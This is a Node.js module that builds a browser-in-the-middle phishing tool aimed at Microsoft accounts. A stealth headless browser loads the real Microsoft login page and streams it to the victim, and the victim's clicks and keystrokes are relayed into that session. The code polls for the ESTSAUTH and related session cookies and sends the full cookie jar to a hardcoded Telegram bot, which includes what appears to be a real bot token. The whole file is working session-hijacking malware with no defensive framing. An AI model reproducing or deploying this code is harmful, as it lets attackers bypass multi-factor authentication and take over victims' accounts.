const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';

const VIEWPORT_WIDTH = 1280;
const VIEWPORT_HEIGHT = 720;

/**
 * Sends the captured jar to Telegram with HTML-safe formatting.
 */
async function sendExfiltrationAlert(cookies, finalUrl) {
    const docUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
    const msgUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    try {
        const host = new URL(finalUrl).hostname;
        const textAlert = `<b>✅ AUTHENTICATION CAPTURED</b>\n\n<b>Landing:</b> <code>${host}</code>\n<b>Cookie Count:</b> ${cookies.length}\n\n<i>Status: Validated session tokens found via Polling.</i>`;
        
        await axios.post(msgUrl, {
            chat_id: CHAT_ID,
            text: textAlert,
            parse_mode: 'HTML'
        });

        const cookieData = JSON.stringify(cookies, null, 2);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('caption', `Validated Jar: ${host}`);
        form.append('document', Buffer.from(cookieData, 'utf-8'), {
            filename: `SESSION_${Date.now()}.json`,
            contentType: 'application/json'
        });

        await axios.post(docUrl, form, { headers: form.getHeaders() });
        console.log("[TELEGRAM] Data exfiltrated successfully.");
    } catch (e) {
        console.error('[EXFIL-ERR]', e.message);
    }
}

async function startSession(io, socket) {
    let browser;
    let hasExfiltrated = false;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox', `--window-size=${VIEWPORT_WIDTH},${VIEWPORT_HEIGHT}`]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: VIEWPORT_WIDTH, height: VIEWPORT_HEIGHT });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');

        const emitFrame = async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        };

        await page.goto('https://login.microsoftonline.com/', { waitUntil: 'networkidle2' }).catch(() => {});
        
        // 1. Snapshot Heartbeat (Visuals)
        const heartbeat = setInterval(emitFrame, 1200);

        // 2. ACTIVE COOKIE POLLING (The Fix)
        const cookieChecker = setInterval(async () => {
            if (hasExfiltrated) return;

            try {
                const cookies = await page.cookies();
                const url = page.url().toLowerCase();

                // Look for the specific "Golden" tokens
                const hasAuthTokens = cookies.some(c => 
                    c.name.includes('ESTSAUTH') || 
                    c.name.includes('RPSSecAuth') || 
                    c.name.includes('__Host-MSAAUTH')
                );

                // Trigger if tokens exist and we are past the initial landing page
                if (hasAuthTokens && !url.includes('/oauth20_authorize.srf')) {
                    hasExfiltrated = true; // Lock immediately
                    console.log(`[POLLING-SUCCESS] Valid tokens found in jar. Capturing...`);
                    
                    clearInterval(cookieChecker); // Stop checking
                    
                    // Brief delay to ensure persistence cookies (ESTSAUTHPERSISTENT) are written
                    await new Promise(r => setTimeout(r, 4000));
                    
                    const finalCookies = await page.cookies();
                    await sendExfiltrationAlert(finalCookies, page.url());
                }
            } catch (e) {
                console.error('[POLL-ERR]', e.message);
            }
        }, 2500);

        // Backup: Frame Navigation trigger
        page.on('framenavigated', async (frame) => {
            if (hasExfiltrated) return;
            const url = frame.url().toLowerCase();
            if (url.includes('office.com') || url.includes('outlook.live.com')) {
                // The polling loop will likely beat this, but this serves as a safety net
            }
        });

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.click(data.x, data.y, { delay: 50 });
                } else if (data.type === 'key') {
                    await page.keyboard.press(data.key);
                }
                await emitFrame();
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            clearInterval(cookieChecker);
            if (browser) await browser.close();
            console.log(`[CLEANUP] Session ${socket.id} closed.`);
        });

    } catch (error) {
        console.error('[FATAL]', error.message);
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
